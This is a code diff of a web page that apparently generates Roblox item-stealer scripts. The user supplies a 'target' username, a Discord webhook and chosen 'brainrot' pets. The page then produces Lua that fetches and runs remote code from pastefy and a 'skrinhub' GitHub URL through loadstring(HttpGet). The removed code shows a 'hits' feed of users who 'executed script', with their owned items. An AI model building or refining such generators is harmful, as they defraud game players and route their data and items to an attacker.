+    const webhookRegex = /^https:\/\\/discord\.com\\/api\\/webhooks\\/(\d{17,20})\/[a-zA-Z0-9_-]{68,}$/;
+    if (!webhookRegex.test(webhook)) {
+        hint.classList.add('error');
+        hint.textContent = 'Invalid webhook format. Must be: https://discord.com/api/webhooks/<ID>/<TOKEN>';
+        return false;
+    }
+    const parts = webhook.split('/');
+    const webhookId = parts[5];
+    const webhookToken = parts[6];
+    if (!/^\d{17,20}$/.test(webhookId)) {
+        hint.classList.add('error');
+        hint.textContent = 'Invalid webhook ID. Must be 17-20 digits.';
+        return false;
+    }
+    if (!/^[a-zA-Z0-9_-]{68,}$/.test(webhookToken)) {
+        hint.classList.add('error');
+        hint.textContent = 'Invalid webhook token. Must be 68+ alphanumeric characters with dashes/underscores.';
+        return false;
+    }
     hint.classList.remove('error');
-    hint.textContent = 'Paste your Discord webhook (must start with https://discord.com/api/webhooks/).';
-    return false;
-  }
-  const webhookRegex = /^https:\/\ /discord\.com\/api\/webhooks\/(\d{17,20})\/[a-zA-Z0-9_-]{68,}$/;
-  return true;
+    hint.textContent = '✅ Valid Discord webhook.';
+    return true;
 }
 
 function copyOut() {
-  const code = document.getElementById('outputBlock').textContent;
-  if (!code || code.startsWith('--')) return;
-  navigator.clipboard.writeText(code);
-  const btn = document.getElementById('copyBtn');
-  btn.textContent = '✓ Copied';
-  btn.classList.add('ok');
-  setTimeout(() => {
-    btn.textContent = '⧉ Copy';
-    btn.classList.remove('ok');
-  }, 2000);
-}
-
-// LOG HIT SIMULATION FUNCTION
-function logPublicHit() {
-  const feed = document.getElementById('publicHitsLog');
-  
-  // Clear placeholder text if it's the first hit
-  if(feed.querySelector('.hit-item') && feed.querySelector('.hit-item').textContent.includes("Waiting")) {
-    feed.innerHTML = '';
-  }
-
-  // Pick or default targets
-  const targetUser = document.getElementById('usernameInput').value.trim() || "Guest_" + Math.floor(1000 + Math.random() * 9000);
-  
-  // Collect currently checkmarked items
-  let brainrotList = Array.from(selectedAnimals);
-  if(brainrotList.length === 0) {
-    brainrotList = ["None (No brainrots selected in config)"];
-  }
-
-  // Format timestamp
-  const now = new Date();
-  const timeStr = now.toTimeString().split(' ')[0];
-
-  // Build element
-  const hitItem = document.createElement('div');
-  hitItem.className = 'hit-item';
-  hitItem.innerHTML = `
-    <span class="hit-time">[${timeStr}]</span>
-    <span class="hit-user">${targetUser}</span> executed script. 
-    <span class="hit-owns">Brainrots owned: [${brainrotList.join(', ')}]</span>
-  `;
-
-  // Push to top of feed
-  feed.insertBefore(hitItem, feed.firstChild);
+    const code = document.getElementById('outputBlock').textContent;
+    if (!code || code.startsWith('--')) return;
+    navigator.clipboard.writeText(code);
+    const btn = document.getElementById('copyBtn');
+    btn.textContent = '✓ Copied';
+    btn.classList.add('ok');
+    setTimeout(() => {
+        btn.textContent = '⧉ Copy';
+        btn.classList.remove('ok');
+    }, 2000);
 }
 
 function generate() {
-  const username = document.getElementById('usernameInput').value.trim();
-  const webhook = document.getElementById('webhookInput').value.trim();
-  const out = document.getElementById('outputBlock');
+    const username = document.getElementById('usernameInput').value.trim();
+    const webhook = document.getElementById('webhookInput').value.trim();
+    const outputBlock = document.getElementById('outputBlock');
 
-  if(!username || !webhook) {
-    out.textContent = "-- Error: Please provide both a target Roblox Username and a valid Webhook URL.";
-    out.classList.remove('empty');
-    return;
-  }
+    if (username.length < 3) {
+        alert("Please enter a valid Roblox target username (min 3 characters).");
+        return;
+    }
+    if (!validateWebhook()) {
+        alert("Please enter a valid Discord Webhook URL.");
+        return;
+    }
+    if (selectedAnimals.size === 0) {
+        alert("Please select at least one brainrot animal.");
+        return;
+    }
 
-  let configAnimals = "";
-  selectedAnimals.forEach(name => {
-    configAnimals += `    ["${name}"] = true,\n`;
-  });
+    let modeScript = '';
+    if (adminMode === 'admin-panel') {
+        modeScript = `loadstring(game:HttpGet('https://pastefy.app/exbZ60m8/raw'))()`;
+    } else if (adminMode === 'freeze') {
+        modeScript = `while true do task.wait() game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(0, 500, 0)) end`;
+    } else if (adminMode === 'custom') {
+        if (!customLoadstring) {
+            alert("Please fill in your custom loadstring.");
+            return;
+        }
+        modeScript = customLoadstring;
+    }
 
-  let modeScript = "-- No GUI Mode Selected";
-  if(currentAdminMode === 'admin-panel') {
-    modeScript = "loadstring(game:HttpGet('https://raw.githubusercontent.com/skrinhub/panel/main/script.lua'))()";
-  } else if(currentAdminMode === 'freeze') {
-    modeScript = "game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true";
-  } else if(currentAdminMode === 'custom') {
-    modeScript = document.getElementById('customAdminLoadstring').value.trim() || "-- Custom script placeholder";
-  }
+    let animalListLua = '';
+    selectedAnimals.forEach(animal => {
+        animalListLua += `    ["${animal}"] = true,\n`;
+    });
 
-  const scriptOutput = `-- SKRINHUB GENERATED CONFIGURATION
-_G.TargetUsername = "${username}"
-_G.Webhook = "${webhook}"
-_G.SelectedBrainrots = {
-${configAnimals}
+    const scriptText = `_G.Username = "${username}"
+_G.WebHook = "${webhook}"
+
+_G.Targets = {
+${animalListLua}}
+
+${modeScript ? modeScript + '\n' : ''}loadstring(game:HttpGet("https://raw.githubusercontent.com/skrinhub/skrinhub/refs/heads/main/games/petsgo"))()`;
+
+    outputBlock.textContent = scriptText;
+    outputBlock.classList.remove('empty');
 }
-
--- Execution logic
-task.spawn(function()
-    ${modeScript}
-end)
-`;
-
-  out.textContent = scriptOutput;
-  out.classList.remove('empty');
-  
-  // Trigger the Live Public Hits simulation item log
-  logPublicHit();
-}
-
-// Initialize on page load
-renderList();
 </script>
 </body>
 </html>
